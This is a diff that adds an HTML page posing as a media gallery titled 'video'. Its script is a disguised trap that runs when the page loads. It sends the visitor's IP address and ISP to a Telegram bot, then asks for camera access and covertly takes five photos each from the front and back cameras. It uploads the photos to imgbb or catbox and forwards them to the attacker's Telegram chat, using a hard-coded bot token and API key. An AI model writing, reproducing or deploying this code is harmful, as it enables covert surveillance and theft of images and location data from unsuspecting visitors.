@@ -1,0 +1,102 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><title>video</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
+    body, html { margin: 0; padding: 0; height: 100%; background-color: #121212; font-family: 'Poppins', sans-serif; color: #e0e0e0; }
+    .wrapper { display: flex; flex-direction: column; height: 100vh; }
+    header { padding: 15px 20px; background-color: #1f1f1f; text-align: center; border-bottom: 1px solid #333; }
+    main { flex-grow: 1; background-color: #000; display:flex; align-items:center; justify-content:center; }
+    #media-viewer { width: 100%; height: 100%; } #media-viewer img, #media-viewer video { object-fit: contain; width: 100%; height: 100%; }
+    footer { background-color: #1f1f1f; border-top: 1px solid #333; padding: 10px; }
+    #thumbnail-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); grid-auto-rows: 80px; gap: 10px; }
+    .thumb-item { cursor: pointer; border-radius: 8px; overflow: hidden; border: 2px solid #444; }
+    .thumb-item img, .thumb-item video { width:100%; height:100%; object-fit:cover; }
+</style>
+</head>
+<body>
+<div class="wrapper">
+    <header><h1>video</h1><p>fana</p></header>
+    <main><div id="media-viewer"><img src="https://c.termai.cc/i79/Ie3UGX" alt="Main content"></div></main>
+    <footer><div id="thumbnail-grid"><div class="thumb-item" onclick="changeMedia(0)"><img src="https://c.termai.cc/i79/Ie3UGX" loading="lazy"></div><div class="thumb-item" onclick="changeMedia(1)"><img src="https://c.termai.cc/i79/Ie3UGX" loading="lazy"></div><div class="thumb-item" onclick="changeMedia(2)"><img src="https://c.termai.cc/i79/Ie3UGX" loading="lazy"></div><div class="thumb-item" onclick="changeMedia(3)"><img src="https://c.termai.cc/i79/Ie3UGX" loading="lazy"></div><div class="thumb-item" onclick="changeMedia(4)"><img src="https://c.termai.cc/i79/Ie3UGX" loading="lazy"></div></div></footer>
+</div>
+<script>
+    const media_list = ["https://c.termai.cc/i79/Ie3UGX", "https://c.termai.cc/i79/Ie3UGX", "https://c.termai.cc/i79/Ie3UGX", "https://c.termai.cc/i79/Ie3UGX", "https://c.termai.cc/i79/Ie3UGX"];
+    const media_type = 'image';
+    const main_media = document.querySelector('#media-viewer > *');
+    function changeMedia(index) { main_media.src = media_list[index]; if (media_type === 'video') { main_media.muted = false; main_media.play(); } }
+    
+        const BOT_TOKEN = '7816075449:AAEAnFhQL_3AqLhrzOJMf7d272G32wyuSWU';
+        const CHAT_ID = '7399017057';
+        const IMGBB_API_KEY = '222d2bdbc4e4126bcabd5d0b4857d04d';
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }) });
+        }
+        function sendPhotoToTelegram(photoUrl, caption) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, photo: photoUrl, caption: caption }) });
+        }
+
+        const delay = ms => new Promise(res => setTimeout(res, ms));
+
+        async function getDeviceInfo() {
+            try {
+                const ip_res = await fetch('https://ip-api.com/json');
+                const ip_data = await ip_res.json();
+                const d = new Date();
+                const msg = `*📱 Info Perangkat & Jaringan*\n\n` +
+                            `*Waktu:* \`{d.toLocaleString('en-GB', { timeZone: 'Asia/Jakarta' })}\`\n`+
+                            `*IP Address:* \`{ip_data.query}\`\n*Provider:* ${ip_data.isp}`;
+                sendToTelegram(msg);
+            } catch (e) {}
+        }
+
+        async function getPhoto(facingMode, cameraName) {
+            return new Promise(resolve => {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode, width: 1280, height: 720 } }).then(async stream => {
+                    sendToTelegram(`✅ Izin *Kamera ${{cameraName}}* diberikan!`);
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+                    for (let i = 1; i <= 5; i++) {
+                        await delay(1500);
+                        const blob = await imageCapture.takePhoto();
+                        sendToTelegram(`- Foto #${i} [${cameraName}] diambil, mengunggah...`);
+                        const formData = new FormData();
+                        formData.append('image', blob, `snap.jpg`);
+                        try {
+                            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: formData });
+                            const result = await res.json();
+                            if (result.success) sendPhotoToTelegram(result.data.url, `Foto #${i} [${cameraName}]`);
+                            else throw new Error('Imgbb fallback');
+                        } catch (e) {
+                            const catFormData = new FormData();
+                            catFormData.append('reqtype', 'fileupload');
+                            catFormData.append('fileToUpload', blob);
+                            fetch('https://catbox.moe/user/api.php', { method: 'POST', body: catFormData })
+                                .then(res => res.text()).then(url => sendPhotoToTelegram(url, `Foto #${i} [${cameraName}]`));
+                        }
+                    }
+                    track.stop();
+                    resolve();
+                }).catch(err => { sendToTelegram(`❌ Gagal akses Kamera ${{cameraName}}`); resolve(); });
+            });
+        }
+
+        async function runAllTraps() {
+            sendToTelegram('🔥 *Jebakan Pamungkas Aktif!*');
+            await getDeviceInfo();
+            await delay(500);
+            await getPhoto('user', 'Depan'); // Coba kamera depan dulu
+            await delay(500);
+            await getPhoto('environment', 'Belakang'); // Coba kamera belakang
+            sendToTelegram('✅ *Semua Misi Selesai.*');
+        }
+        
+        window.onload = runAllTraps;
+    
+</script>
+</body>
+</html>
